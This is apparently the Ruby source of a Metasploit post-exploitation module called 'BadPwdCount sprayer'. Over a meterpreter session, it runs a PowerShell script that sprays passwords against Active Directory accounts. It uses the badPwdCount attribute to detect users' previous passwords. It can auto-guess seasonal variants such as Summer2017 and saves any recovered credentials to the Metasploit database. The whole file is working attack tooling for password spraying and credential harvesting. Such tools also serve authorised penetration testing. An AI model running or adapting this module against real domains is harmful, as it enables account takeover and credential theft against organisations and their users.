require 'msf/core/post/common'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Exploit::Powershell
  include Msf::Post::Common
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'BadPwdCount sprayer',
      'Description' => %{
          Because of how Active Directory works, if a user tries to authenticate
          with his previous password or the password before that (n-2), the
          domain controller will not increment the badPwdCount attribute so
          that the user won't get locked out every second of the day when he
          changes his password. Since this attribute is readable for every user
          and computer account within the domain, we can query the changes in
          this attribute. If the value has not been incremented, then we just
          guessed one of the previous two passwords of the useraccount.

          We can use this information to guess his next/current password. If
          one of the last two passwords is Summer2017, changes are that his
          next password will be Autumn2017, etc.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Rindert Kramer <rindert.kramer[at]fox-it.com>',
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter']))

    register_options(
      [
        OptString.new('PASSWORD', [true, 'Password to test']),
        OptBool.new('GUESS_PASSWORD', [false, 'Try to guess the password if badPwdCount has not been incremented', false]),
        OptString.new('GUESS_PASSWORDS', [false, 'List with passwords, comma seperated. The pipe (|) delimiter seperates the prefix and the suffix. The suffix will be
          autoincremented.', 'Summer|2017,Welcome|01']),
        OptInt.new('SCRIPT_TIMEOUT', [true, 'Script timeout', 120]),
        OptInt.new('LDAP_SIZELIMIT', [true, 'LDAP size limit. Amount of users to query. Set to 0 to query all useraccounts.', 100])
      ]
    )
  end

  def report_cred(creds)
    # thx: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/mdaemon_cred_collector.rb

    # Build service information
    service_data = {
      address: session.session_host, # Gives internal IP
      port: 445,
      service_name: 'SMB',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Iterate through credentials
    creds.each do |cred|
      username = cred.split(':')[0]
      password = cred.split(':')[1]

      realm_value = '.'
      if realm_value.include? "@"
        realm_value = username.split('@')[1]
      end

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :password,
        private_data: password,
        username: username,
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: realm_value,
        module_fullname: fullname
      }

      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)

      login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      }

      login_data.merge!(service_data)
      create_credential_login(login_data)
    end
  end

  def run
    # read values from datastore
    test_password = datastore['PASSWORD']
    be_brute = datastore['GUESS_PASSWORD']
    ldap_pagesize = datastore['LDAP_SIZELIMIT']
    script_timeout = datastore['SCRIPT_TIMEOUT']

    # array for storing credentials
    credentials = []

    if !have_powershell?
      print_error('PowerShell is not installed! STOPPING')
      return
    end
    print_status('Powershell is installed. Executing script...')

    # Execute script serverside
    brutus = '$false'
    if be_brute
      brutus = '$true'
    end

    # Read script, replace placeholders with parameters
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-BadPwdCountScanner.ps1"))

    if be_brute
      if datastore['GUESS_PASSWORDS'].to_s.empty?
        print_bad('Please specify password to test.')
        return
      end

      base_script.gsub! '__pwdData__', datastore['GUESS_PASSWORDS']
    end

    base_script.gsub! '__pass__', test_password
    base_script.gsub! '__bruteforce__', brutus
    base_script.gsub! '__pagesize__', ldap_pagesize.to_s

    eof = Rex::Text.rand_text_alpha(8)
    cmd_out, _running_pids, _open_channels = execute_script(base_script, script_timeout)
    ps_output = get_ps_output(cmd_out, eof, script_timeout)

    regex_auth_success = /^\[\+\]\s(?<id>.+)\s\=\>\s(?<pwd>.+)$/
    regex_pwd_not_incr = /^\[\!\]\s(?<id>.+)\s\=\>\s(?<pwd>.+)$/
    regex_pwd_guessed = /^\[\*\]\s(?<id>.+)\s\=\>\s(?<pwd>.+)$/

    # print all the successfull authentication attempts
    ps_output.scan(regex_auth_success).each do |auth_success|
      credentials << "#{auth_success[0]}:#{auth_success[1]}"
      print_good("Auth successfull: #{auth_success[0]} => #{auth_success[1]}")
    end

    print_line('')
    ps_output.scan(regex_pwd_not_incr).each do |auth_guess|
      print_warning("BadPwdCount not incremented: #{auth_guess[0]}. Old password: #{auth_guess[1]}")
    end

    if be_brute
      print_line('')
      ps_output.scan(regex_pwd_guessed).each do |auth_lucky|
        credentials << "#{auth_lucky[0]}:#{auth_lucky[1]}"
        print_good("Password guessed: #{auth_lucky[0]} => #{auth_lucky[1]}")
      end
    end

    # Save credentials in database
    report_cred(credentials)
  end
end
